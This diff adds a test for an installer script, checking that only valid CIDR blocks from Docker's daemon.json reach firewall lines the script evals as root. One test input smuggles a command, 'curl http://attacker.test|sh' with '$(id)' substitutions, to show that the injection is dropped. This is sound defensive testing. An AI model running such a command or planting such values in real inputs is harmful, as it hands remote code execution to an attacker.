@@ -304,3 +304,29 @@ test('Dockerfile, .dockerignore, package.json and the workflows agree with the i
   expect(tail).toContain('shellcheck -s sh install.sh')
   expect(tail).toContain('docker build --build-arg VERSION=ci -t instacloud:ci .')
 })
+
+// `run_rules` evals each rendered firewall line as root, and those lines interpolate the address
+// pool bases read out of /etc/docker/daemon.json, a file this script does not own. The two helpers
+// below are the gate. They are sliced out of the shipped script rather than restated, so the test
+// cannot drift away from what actually runs.
+const cidrHelpers = (): string => {
+  const start = script.indexOf('valid_cidr() {')
+  const end = script.indexOf('POOL_BASES=$POOL_BASE_DEFAULT', start)
+  expect(start, 'valid_cidr is gone from install.sh').toBeGreaterThan(0)
+  expect(end).toBeGreaterThan(start)
+  return `warn() { printf 'warning: %s\\n' "$*" >&2; }\n${script.slice(start, end)}`
+}
+
+test('only a CIDR block survives into the firewall lines the installer evals', () => {
+  const keep = (input: string) =>
+    spawnSync('sh', ['-c', `${cidrHelpers()}\nkeep_cidrs "$1"`, 'sh', input], { encoding: 'utf8' })
+
+  expect(keep('10.100.0.0/14 172.16.0.0/12').stdout).toBe('10.100.0.0/14 172.16.0.0/12')
+  // A base carrying shell metacharacters is dropped, loudly, and never reaches the eval.
+  const hostile = keep('10.100.0.0/14 ;curl http://attacker.test|sh; $(id) `id`')
+  expect(hostile.stdout).toBe('10.100.0.0/14')
+  expect(hostile.stderr).toContain('not a CIDR block')
+  expect(hostile.stdout).not.toContain('curl')
+  // A bare address with no prefix length, and a name, are not CIDR blocks either.
+  expect(keep('10.100.0.0 fd00::/8 example.test').stdout).toBe('')
+})
